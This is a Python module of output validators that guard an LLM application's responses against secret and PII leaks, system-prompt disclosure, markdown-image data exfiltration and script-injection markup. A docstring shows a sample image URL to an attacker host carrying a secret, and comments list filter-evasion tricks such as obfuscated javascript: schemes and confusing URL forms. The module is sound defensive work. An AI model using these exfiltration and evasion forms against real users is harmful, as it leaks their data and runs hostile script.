"""Output validators: treat model output as untrusted input to whatever consumes it.

(OWASP LLM05 *Improper Output Handling*, plus the data-exfiltration channel
that markdown rendering opens up for LLM01/LLM02.)
"""

from __future__ import annotations

import html
import json
import re
from collections.abc import Iterable, Sequence
from dataclasses import dataclass, field
from enum import StrEnum
from typing import Any, Protocol
from urllib.parse import urlsplit

import jsonschema

from agentsec.middleware.redact import redact_text


class Action(StrEnum):
    BLOCK = "block"  # withhold the whole output
    REDACT = "redact"  # remove the offending span, deliver the rest
    WARN = "warn"  # report only


@dataclass(frozen=True)
class Violation:
    validator: str
    message: str
    action: Action


class OutputValidator(Protocol):
    name: str

    def check(self, text: str) -> list[Violation]: ...

    def sanitize(self, text: str) -> str: ...


@dataclass
class GuardResult:
    text: str
    allowed: bool
    violations: list[Violation] = field(default_factory=list)

    @property
    def redacted(self) -> bool:
        return any(v.action == Action.REDACT for v in self.violations)


# --------------------------------------------------------------------------- validators
class SecretLeakValidator:
    """Credentials and keys in output. Redacts by default."""

    name = "secret_leak"

    def __init__(self, action: Action = Action.REDACT) -> None:
        self.action = action

    def check(self, text: str) -> list[Violation]:
        _, findings = redact_text(text, include_pii=False)
        return [Violation(self.name, f"{f.kind} detected in output", self.action) for f in findings]

    def sanitize(self, text: str) -> str:
        return redact_text(text, include_pii=False)[0]


class PIIValidator:
    """US SSNs and Luhn-valid payment card numbers."""

    name = "pii"

    def __init__(self, action: Action = Action.REDACT) -> None:
        self.action = action

    def check(self, text: str) -> list[Violation]:
        _, findings = redact_text(text)
        return [
            Violation(self.name, f"{f.kind} detected in output", self.action)
            for f in findings
            if f.category == "pii"
        ]

    def sanitize(self, text: str) -> str:
        # Redact only PII here; secrets are handled by SecretLeakValidator.
        out: list[str] = []
        _, findings = redact_text(text)
        cursor = 0
        for f in findings:
            if f.category != "pii":
                continue
            out.append(text[cursor : f.start])
            out.append(f"[REDACTED:{f.kind}]")
            cursor = f.end
        out.append(text[cursor:])
        return "".join(out)


class ProtectedStringValidator:
    """Blocks output containing strings that must never leave the system.

    Register system-prompt fragments, internal hostnames, canary tokens. The
    match is case-insensitive and whitespace-insensitive. It will not catch a
    model that re-encodes the secret (base64, spaced-out characters, etc.);
    treat it as a tripwire, not a guarantee.
    """

    name = "protected_string"

    def __init__(self, protected: Iterable[str], action: Action = Action.BLOCK) -> None:
        self._protected = [p for p in protected if p]
        self.action = action

    @staticmethod
    def _norm(text: str) -> str:
        return re.sub(r"\s+", "", text).lower()

    def check(self, text: str) -> list[Violation]:
        haystack = self._norm(text)
        return [
            Violation(self.name, "protected string present in output", self.action)
            for p in self._protected
            if self._norm(p) in haystack
        ]

    def sanitize(self, text: str) -> str:
        # check() ignores case AND whitespace, so removal must too. Matching the literal string
        # would report "redacted" while leaving a spaced-out copy of the secret in the output.
        for p in self._protected:
            chars = [re.escape(c) for c in re.sub(r"\s+", "", p)]
            if chars:
                text = re.sub(r"\s*".join(chars), "[REDACTED:protected]", text, flags=re.IGNORECASE)
        return text


# Alt text may hold one level of nested brackets; excluding "[" from the plain-character
# class keeps every start position O(1) on "![![![...", where "[^\]]*" was quadratic.
_ALT = r"(?:[^\[\]]|\[[^\[\]]*\])*"
_MD_IMAGE = re.compile(r"!\[" + _ALT + r"\]\(\s*<?([^)\s>]+)")
# Reference-style images: ![alt][label], ![label][] and ![label], resolved through a
# "[label]: url" definition. Labels cannot contain brackets and are capped at 999 characters.
_MD_REF_IMAGE = re.compile(r"!\[(" + _ALT + r")\](?:\[([^\[\]]{0,999})\])?")
_MD_REF_DEF = re.compile(r"^[ ]{0,3}\[([^\[\]]{1,999})\]:[ \t]*<?([^\s>]+)", re.MULTILINE)
# Tags are found quote-aware first, then tokenised into attributes, so a quoted value such
# as title=' src="..."' is one attribute, not a src. One regex that finds tags and
# attributes together retries from every "<" and is quadratic on "<img<img<img...".
_TAG = re.compile(r"""<([a-z][^\s/>"']*)(?:[^>"']|"[^"]*"|'[^']*')*""", re.IGNORECASE)
_ATTR = re.compile(r"""([^\s"'>/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]*)))?""")
_FETCH_ATTRS = {"src", "srcset", "poster", "background", "data"}
# Elements whose href is fetched without a click: stylesheets/preloads and SVG resources.
_FETCH_HREF_TAGS = {"link", "image", "use", "feimage"}
_CSS_URL = re.compile(r"""url\(\s*["']?([^"')\s]+)""", re.IGNORECASE)
_CSS_IMPORT = re.compile(r"""@import\s+["']([^"']+)""", re.IGNORECASE)
_C0_AND_SPACE = "".join(map(chr, range(0x21)))
_URL = re.compile(r"https?://[^\s<>\"')\]]+", re.IGNORECASE)


def _label(text: str) -> str:
    # CommonMark matches labels case-insensitively with internal whitespace collapsed.
    return " ".join(text.split()).casefold()


def _fetched_urls(text: str) -> list[str]:
    """URLs a renderer fetches with no click: images, srcset, poster, stylesheets, CSS."""
    urls = _MD_IMAGE.findall(text)
    # Every definition of a label counts, not only the first: one inside a code block is not
    # a definition to a renderer, so the "first" one cannot be picked reliably here.
    definitions: dict[str, list[str]] = {}
    for label, url in _MD_REF_DEF.findall(text):
        definitions.setdefault(_label(label), []).append(url)
    if definitions:
        # A set: each referenced label's URLs are added once, however often it is used
        # (otherwise N references x M definitions of one label is quadratic).
        used = {_label(label or alt) for alt, label in _MD_REF_IMAGE.findall(text)}
        for label in used & definitions.keys():
            urls += dict.fromkeys(definitions[label])
    for tag in _TAG.finditer(text):
        tag_name = tag[1].lower()
        for m in _ATTR.finditer(tag[0], len(tag[1]) + 1):
            name = m[1].lower()
            value = m[2] or m[3] or m[4] or ""
            if not value:
                continue
            if name == "srcset":
                # "a.png 1x, b.png 2x": the URL is the first token of each candidate.
                urls += [c.split()[0] for c in value.split(",") if c.strip()]
            elif name in _FETCH_ATTRS or (
                name in {"href", "xlink:href"} and tag_name in _FETCH_HREF_TAGS
            ):
                urls.append(value)
    urls += _CSS_URL.findall(text) + _CSS_IMPORT.findall(text)
    return urls


def _host_allowed(host: str, allowed: Sequence[str]) -> bool:
    host = host.lower().rstrip(".")
    for pattern in allowed:
        p = pattern.lower()
        if p.startswith("*."):
            if host.endswith(p[1:]):
                return True
        elif host == p:
            return True
    return False


class ExfilLinkValidator:
    """Flags URLs that could smuggle data out when a client renders or fetches them.

    Markdown/HTML images are auto-fetched by many chat UIs, so an injected
    ``![x](https://attacker/?d=<secret>)`` leaks with zero user interaction.
    Any URL to a host outside ``allowed_hosts`` is reported. Images are always
    treated as violations; plain links honour ``links_action``.
    """

    name = "exfil_link"

    def __init__(
        self,
        allowed_hosts: Sequence[str] = (),
        *,
        action: Action = Action.REDACT,
        links_action: Action | None = None,
    ) -> None:
        self.allowed_hosts = tuple(allowed_hosts)
        self.action = action
        self.links_action = links_action or action

    def _external_urls(self, text: str) -> tuple[list[str], list[str]]:
        images = _fetched_urls(text)
        image_set = set(images)
        bad_images = [u for u in images if self._is_external(u)]
        bad_links = [u for u in _URL.findall(text) if u not in image_set and self._is_external(u)]
        return bad_images, bad_links

    @staticmethod
    def _fetch_host(url: str) -> tuple[bool, str | None]:
        """``(is_http, host)`` as a browser would fetch ``url``; host None if unreadable.

        urlsplit disagrees with browsers (the WHATWG URL parser) in ways that hide the
        real host, so normalise first:
        - tabs/newlines are dropped and "\\" is read as "/", so "https://evil\\@ok/"
          goes to evil, not ok;
        - "//host/x" is a network-path reference fetched from ``host`` with the page's
          scheme;
        - for http(s), any number of slashes after the scheme is accepted, so
          "https:/evil/" and "https:///evil/" both go to evil;
        - character references are decoded (as in attribute values and markdown
          destinations) and leading/trailing spaces and controls are stripped, so
          "https&#58;//evil" and " https://evil" go to evil.
        """
        url = html.unescape(url).strip(_C0_AND_SPACE)
        url = re.sub(r"[\t\n\r]", "", url).replace("\\", "/")
        if url.startswith("//"):
            url = "https:" + url
        m = re.match(r"(?i)(https?):/*", url)
        if not m:
            # relative/data/javascript URLs are handled by DangerousContentValidator
            return False, None
        try:
            return True, urlsplit(f"{m.group(1)}://{url[m.end() :]}").hostname
        except ValueError:  # e.g. a malformed "[...]" host
            return True, None

    def _is_external(self, url: str) -> bool:
        is_http, host = self._fetch_host(url)
        if not is_http:
            return False
        # An http(s) URL whose host we cannot read is treated as external (fail closed).
        return host is None or not _host_allowed(host, self.allowed_hosts)

    def check(self, text: str) -> list[Violation]:
        images, links = self._external_urls(text)

        def host(u: str) -> str:
            return self._fetch_host(u)[1] or "unparseable host"

        out = [Violation(self.name, f"external image URL ({host(u)})", self.action) for u in images]
        out += [Violation(self.name, f"external URL ({host(u)})", self.links_action) for u in links]
        return out

    def sanitize(self, text: str) -> str:
        images, links = self._external_urls(text)
        for u in sorted(set(images), key=len, reverse=True):
            text = text.replace(u, "[removed-external-url]")
        if self.links_action == Action.REDACT:
            for u in sorted(set(links), key=len, reverse=True):
                text = text.replace(u, "[removed-external-url]")
        return text


def _scheme(word: str) -> re.Pattern[str]:
    # Browsers drop tabs, newlines and other control characters inside a URL scheme, so
    # "java<TAB>script:" executes even though it does not contain the word "javascript".
    gap = r"[\s\x00-\x1f]*"
    return re.compile(gap.join(word) + gap + ":", re.IGNORECASE)


class _InTagEventHandler:
    """Any on* attribute inside a tag, with the ``search``/``sub`` shape of a pattern.

    A deny-list of handler names always misses some (onbegin, onpageshow, ...), and
    requiring a tag keeps prose and code like "one = 1" from matching. Tags are found
    quote-aware, as browsers do (``<img title=">" onerror=...>`` is one tag), and quoted
    attribute values are masked so ``title="online=true"`` is not a handler. One regex
    doing all of it retries from every "<" and is quadratic; finding tags first
    (non-overlapping) and then attributes inside each keeps it linear.
    """

    _TAG = re.compile(r"""<[a-z](?:[^>"']|"[^"]*"|'[^']*')*""", re.IGNORECASE)
    _QUOTED = re.compile(r""""[^"]*"|'[^']*'""")
    # Attributes follow whitespace, "/" or a closing quote. {1,30} bounds the backtracking.
    _ATTR = re.compile(r"(?<=[\s/\"'])on[a-z]{1,30}\s*=", re.IGNORECASE)

    @classmethod
    def _spans(cls, tag: str) -> list[tuple[int, int]]:
        # Same-length mask keeps match positions valid in the original tag.
        masked = cls._QUOTED.sub(lambda m: m[0][0] + "_" * (len(m[0]) - 2) + m[0][-1], tag)
        return [m.span() for m in cls._ATTR.finditer(masked)]

    def search(self, text: str) -> bool:
        return any(self._spans(m[0]) for m in self._TAG.finditer(text))

    def sub(self, repl: str, text: str) -> str:
        def clean(m: re.Match[str]) -> str:
            tag = m[0]
            for start, end in reversed(self._spans(tag)):
                tag = tag[:start] + repl + tag[end:]
            return tag

        return self._TAG.sub(clean, text)


# (pattern, label, also check after decoding character references)
_DANGEROUS = (
    (re.compile(r"<\s*script\b", re.IGNORECASE), "script tag", False),
    (_scheme("javascript"), "javascript: URL", True),
    (_scheme("vbscript"), "vbscript: URL", True),
    (_InTagEventHandler(), "inline event handler", False),
    (re.compile(r"data\s*:\s*text/html", re.IGNORECASE), "data:text/html URL", True),
    (re.compile(r"<\s*(?:iframe|object|embed)\b", re.IGNORECASE), "embedded frame/object", False),
)

# "&" that starts a character reference (named, decimal or hex, ";" optional).
_CHAR_REF = re.compile(r"&(?=#?[A-Za-z0-9])")


class DangerousContentValidator:
    """Markup that turns into script execution if a downstream UI renders it as HTML."""

    name = "dangerous_content"

    def __init__(self, action: Action = Action.BLOCK) -> None:
        self.action = action

    # Browsers (and CommonMark link destinations) decode character references in URLs,
    # so href="&#106;avascript:..." runs script: URL schemes are also checked decoded.
    # Tags are not: "&lt;script&gt;" is displayed as text, never parsed as a tag.
    def check(self, text: str) -> list[Violation]:
        decoded = html.unescape(text)
        return [
            Violation(self.name, f"{label} in output", self.action)
            for pattern, label, check_decoded in _DANGEROUS
            if pattern.search(text) or (check_decoded and pattern.search(decoded))
        ]

    def sanitize(self, text: str) -> str:
        for pattern, _, _ in _DANGEROUS:
            text = pattern.sub("[removed]", text)
        decoded = html.unescape(text)
        if any(check and pattern.search(decoded) for pattern, _, check in _DANGEROUS):
            # A scheme hidden in character references: escape every reference's "&" so a
            # renderer shows it literally instead of decoding it. Never return decoded text:
            # "&amp;#106;" would become "&#106;", which decodes to script on the next pass.
            text = _CHAR_REF.sub("&amp;", text)
        return text


class MaxLengthValidator:
    name = "max_length"

    def __init__(self, max_chars: int, action: Action = Action.BLOCK) -> None:
        self.max_chars = max_chars
        self.action = action

    def check(self, text: str) -> list[Violation]:
        if len(text) > self.max_chars:
            return [Violation(self.name, f"output exceeds {self.max_chars} chars", self.action)]
        return []

    def sanitize(self, text: str) -> str:
        return text[: self.max_chars]


class BlockedPatternValidator:
    """Arbitrary regex deny-list."""

    name = "blocked_pattern"

    def __init__(self, patterns: Iterable[str], action: Action = Action.BLOCK) -> None:
        self._patterns = [re.compile(p, re.IGNORECASE) for p in patterns]
        self.action = action

    def check(self, text: str) -> list[Violation]:
        return [
            Violation(self.name, f"matched {p.pattern!r}", self.action)
            for p in self._patterns
            if p.search(text)
        ]

    def sanitize(self, text: str) -> str:
        for p in self._patterns:
            text = p.sub("[removed]", text)
        return text


class JsonSchemaValidator:
    """For agents whose output feeds a parser: require valid JSON matching a schema."""

    name = "json_schema"

    def __init__(self, schema: dict[str, Any], action: Action = Action.BLOCK) -> None:
        jsonschema.Draft202012Validator.check_schema(schema)
        self._validator = jsonschema.Draft202012Validator(schema)
        self.action = action

    def check(self, text: str) -> list[Violation]:
        try:
            doc = json.loads(text)
        except json.JSONDecodeError as exc:
            return [Violation(self.name, f"output is not valid JSON: {exc.msg}", self.action)]
        return [
            Violation(
                self.name,
                f"{'/'.join(str(p) for p in err.absolute_path) or '<root>'}: {err.message}",
                self.action,
            )
            for err in sorted(self._validator.iter_errors(doc), key=lambda e: list(e.path))
        ]

    def sanitize(self, text: str) -> str:
        return text  # schema violations cannot be repaired by editing


# --------------------------------------------------------------------------- guard
class OutputGuard:
    """Runs validators in order and applies the strictest resulting action.

    ``BLOCK`` withholds the output and returns ``blocked_message``. ``REDACT``
    lets each validator rewrite the text. ``WARN`` only reports.
    """

    def __init__(
        self,
        validators: Sequence[OutputValidator],
        *,
        blocked_message: str = "[response withheld by output policy]",
    ) -> None:
        self.validators = list(validators)
        self.blocked_message = blocked_message

    @classmethod
    def default(
        cls, *, allowed_hosts: Sequence[str] = (), protected: Sequence[str] = ()
    ) -> OutputGuard:
        """Reasonable baseline: secrets, PII, exfil links, dangerous markup."""
        validators: list[OutputValidator] = [
            SecretLeakValidator(),
            PIIValidator(),
            ExfilLinkValidator(allowed_hosts),
            DangerousContentValidator(),
        ]
        if protected:
            validators.append(ProtectedStringValidator(protected))
        return cls(validators)

    def process(self, text: str) -> GuardResult:
        violations: list[Violation] = []
        current = text
        blocked = False
        for v in self.validators:
            found = v.check(current)
            if not found:
                continue
            violations.extend(found)
            if any(x.action == Action.BLOCK for x in found):
                blocked = True
            elif any(x.action == Action.REDACT for x in found):
                current = v.sanitize(current)
                # Fail closed: if the validator still objects to its own sanitised output it
                # could not remove what it found, and "redacted" would be a lie.
                if any(x.action == Action.REDACT for x in v.check(current)):
                    violations.append(
                        Violation(
                            v.name, "could not be fully redacted; output withheld", Action.BLOCK
                        )
                    )
                    blocked = True
        if blocked:
            return GuardResult(self.blocked_message, False, violations)
        return GuardResult(current, True, violations)
